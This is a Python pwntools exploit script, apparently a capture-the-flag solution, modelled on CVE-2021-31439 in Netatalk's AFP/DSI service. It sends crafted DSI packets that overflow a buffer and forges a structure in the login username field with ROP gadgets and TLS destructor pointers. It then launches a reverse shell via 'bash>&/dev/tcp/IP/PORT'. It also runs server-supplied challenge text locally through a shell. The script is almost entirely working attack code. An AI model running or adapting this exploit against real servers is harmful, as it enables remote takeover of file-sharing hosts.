#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import binascii
import sys
from multiprocessing.pool import ThreadPool


# Idea from CVE-2021-31439
# https://www.zerodayinitiative.com/advisories/ZDI-21-492/

context.arch = "amd64"    

USERNAME_ADDR = 0x6567a0


def open_session(r):
    
    # overflow payload
    payload =  flat(
        p32(0xddaa), # quantum must > 32000
    )

    # pack to dsi command format
    dsi_command = flat(
        p8(1),  # DSIOPT_ATTNQUANT
        p8(len(payload)), payload
    )

    # pack to dsi packet format
    '''
    struct dsi_block {
        uint8_t dsi_flags;       /* packet type: request or reply */
        uint8_t dsi_command;     /* command */
        uint16_t dsi_requestID;  /* request ID */
        union {
            uint32_t dsi_code;   /* error code */
            uint32_t dsi_doff;   /* data offset */
        } dsi_data;
        uint32_t dsi_len;        /* total data length */
        uint32_t dsi_reserved;   /* reserved field */
    };
    '''

    dsi_block = flat(
        p8(0), p8(4), p16(1, endianness='big'),
        p32(0xdada), p32(len(dsi_command), endianness='big'), p32(0)
    )

    r.send(dsi_block + dsi_command ) 

# gadget1 = 0x0000000000426919 : mov esi, dword ptr [rbx + 0x50] ; call qword ptr [rbx + 0x48]
# gadget2 = 0x000000000040f98d : mov ecx, edi ; mov rdi, rbx ; call qword ptr [r14 + 0x18]
# gadget3 = 0x0000000000426c4d : mov rdi, qword ptr [rdi + 0x50] ; call qword ptr [rbx + 0x40]

def forge_struct(r, cmd):
    cmd_buf = USERNAME_ADDR + 0xb8
    div_thread_var = USERNAME_ADDR + 0x28
    tls_dtor_list = USERNAME_ADDR + 0x70
    username = b"root\x00\x00\x00\x00"  + p64(USERNAME_ADDR+0x10-0x40)*2 + p64(0x4242424242424242)
    if len(cmd) > 0x38 :
        print("cmd need < 0x38")
    gadget = 0x426919 << 0x11
    gadget2 = 0x000000000040f98d
    gadget3 = 0x0000000000426c4d
    execl = 0x40D015
    c_str = USERNAME_ADDR+0x30
    username += p64(gadget) + p64(cmd_buf) +  b"-c" + b"\x00"*6 + p64(c_str)
    username += p64(0x464646464646) 

    username += p64(gadget) +  p64(cmd_buf)
    username += p64(0x4343434343434343) + p64(execl)*1 + p64(gadget2) + p64(USERNAME_ADDR+0x78)
    username += b"/bin/bash\x00".ljust(0x20,b"\x00")
    username += p64(0x4) + p64(0)*2 + p64(gadget3)
    username += cmd.encode()
    method = b"DHX2\x00" 
    payload = p8(len("AFP3.4")) + b"AFP3.4"
    payload += p8(len(method)) + method
    payload += p8(len(username)) + username

    # pack to dsi command format
    dsi_command = flat(
        p8(18),  # login
        payload
    )
    dsi_block = flat(
        p8(1), p8(2), p16(0xff01, endianness='big'),
        p32(0), p32(len(dsi_command), endianness='big'), p32(0)
    )

    r.send(dsi_block + dsi_command ) 



def do_exploit(r, canary):
    global USERNAME_ADDR
    div = USERNAME_ADDR + 0x10
    tcb = USERNAME_ADDR + 0x100-0x28+0x40
    pointer_guard = 0
    method = b"DHX2\x00"
    username = b"a"*0x30+ b"X"*12
    payload = p8(len("AFP3.4")) + b"AFP3.4"
    payload += p8(len(method)) + method
    payload += p8(len(username)) + username

    overflow = p64(tcb) + p64(div) + b"x"*0x18 + p64(canary) + p64(pointer_guard)
    tlspage = b""
    tlspage = tlspage.ljust(0x280, b"\x41")
    cmdlen = 0x102280-0x10+0x38+100
    dsi_block = flat(
        p8(0), p8(1), p16(1, endianness='big'),
        p32(cmdlen, endianness='big'), p32(0xdeadbeef, endianness='big'), p32(0)
    )


    dtor_list = USERNAME_ADDR+0x20
    
    dsi_command = b"" 
    dsi_command = dsi_command.ljust(0x1021f0-0x10,b"x")
    canary = 0
    dsi_command += p64(0x4343434343434343) + p64(0)*6 + p64(dtor_list) + p64(0)*10 + p64(tcb) + p64(div) + b"x"*0x18 + p64(canary) + p64(pointer_guard)

    r.send(dsi_block + dsi_command ) 


if __name__ == "__main__":

    if len(sys.argv) < 4:
        print("Usage: %s <target ip> <reverse shell ip> <reverse shell port>" % sys.argv[0])
        exit(-1)
    host = sys.argv[1]
    port = 4869
    
    r = remote(host, port)
    r.recv()
    challenge = r.recv().strip()
    ans = subprocess.check_output(challenge,shell=True)
    r.send(ans)
    time.sleep(1)
    open_session(r)
    cmd = "bash>&/dev/tcp/%s/%s 0>&1" % (sys.argv[2], sys.argv[3])
    forge_struct(r, cmd)
    canary = 0
    do_exploit(r, canary)
    print("Wait for reverse shell !")
    r.interactive()
